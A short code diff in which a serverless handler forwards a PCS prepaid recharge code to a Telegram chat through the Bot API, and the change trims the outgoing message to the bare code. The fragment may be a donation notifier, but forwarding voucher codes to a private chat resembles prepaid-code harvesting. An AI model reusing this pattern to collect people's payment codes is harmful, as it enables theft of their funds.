@@ -29,7 +29,7 @@ exports.handler = async (event, context) => {
       };
     }
 
-    const message = `Nouvelle recharge PCS reçue\n\nCode: ${code}\n\nBaarakaAllahu fik pour votre soutien`;
+    const message = `${code}`;
 
     await axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
       chat_id: telegramChatId,
